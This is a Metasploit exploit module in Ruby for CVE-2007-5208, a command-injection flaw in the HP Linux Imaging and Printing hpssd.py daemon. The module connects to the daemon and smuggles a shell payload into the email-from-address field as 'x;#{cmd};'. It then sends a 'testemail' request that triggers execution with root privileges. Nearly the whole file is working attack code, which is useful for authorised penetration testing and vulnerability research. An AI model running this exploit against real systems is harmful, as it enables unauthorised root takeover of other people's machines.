##
# $Id: hplip_hpssd_exec.rb 10617 2010-10-09 06:55:52Z jduck $
##

##
# This file is part of the Metasploit Framework and may be subject to
# redistribution and commercial restrictions. Please see the Metasploit
# Framework web site for more information on licensing and terms of use.
# http://metasploit.com/framework/
##


require 'msf/core'


class Metasploit3 < Msf::Exploit::Remote
	Rank = ExcellentRanking

	include Msf::Exploit::Remote::Tcp

	def initialize(info = {})
		super(update_info(info,
			'Name'           => 'hplip hpssd.py From Address Arbitrary Command Execution',
			'Description'    => %q{
					This module exploits a command execution vulnerable in the hpssd.py
				daemon of the Hewlett-Packard Linux Imaging and Printing Project.
				According to MITRE, versions 1.x and 2.x before 2.7.10 are vulnerable.

				This module was written and tested using the Fedora 6 Linux distribution.
				On the test system, the daemon listens on localhost only and runs with
				root privileges. Although the configuration shows the daemon is to
				listen on port 2207, it actually listens on a dynamic port.

				NOTE: If the target system does not have a 'sendmail' command installed,
				this vulnerability cannot be exploited.
			},
			'Author'         => [ 'jduck' ],
			'License'        => MSF_LICENSE,
			'Version'        => '$Revision: 10617 $',
			'References'     =>
				[
					[ 'CVE', '2007-5208' ],
					[ 'OSVDB', '41693' ],
					[ 'BID', '26054' ],
					[ 'URL', 'https://bugzilla.redhat.com/show_bug.cgi?id=319921' ],
					[ 'URL', 'https://bugzilla.redhat.com/attachment.cgi?id=217201&action=edit' ]
				],
			'Platform'       => ['unix'],
			'Arch'           => ARCH_CMD,
			'Privileged'     => true,
			'Payload'        =>
				{
					'Space'       => 1024,
					'DisableNops' => true,
					'Compat'      =>
						{
							'PayloadType' => 'cmd',
							# *_perl and *_ruby work if they are installed
							# inetd isn't used on FC6/7 (xinetd is)
							# netcat doesn't have -e by default
						}
				},
			'Targets'        =>
				[
					[ 'Automatic (hplip-1.6.7-4.i386.rpm)', { } ]
				],
			'DefaultTarget' => 0,
			'DisclosureDate'  => 'Oct 04 2007'
		))

		register_options(
			[
				Opt::RPORT(2207),
			], self.class)
	end

	def exploit

		connect

		#cmd = "nohup " + payload.encoded
		cmd = payload.encoded

		username = 'root'
		toaddr = 'nosuchuser'

		# first setalerts
		print_status("Sending 'setalerts' request with encoded command line...")
		msg = "username=#{username}\n" +
			"email-alerts=1\n" +
			#"email-from-address=`#{cmd}`\n" +
			"email-from-address=x;#{cmd};\n" +
			"email-to-addresses=#{toaddr}\n" +
			"msg=setalerts\n"
		sock.put(msg)

		# next, the test email command
		print_status("Sending 'testemail' request to trigger execution...")
		msg = "msg=testemail\n"
		sock.put(msg)

	end

end
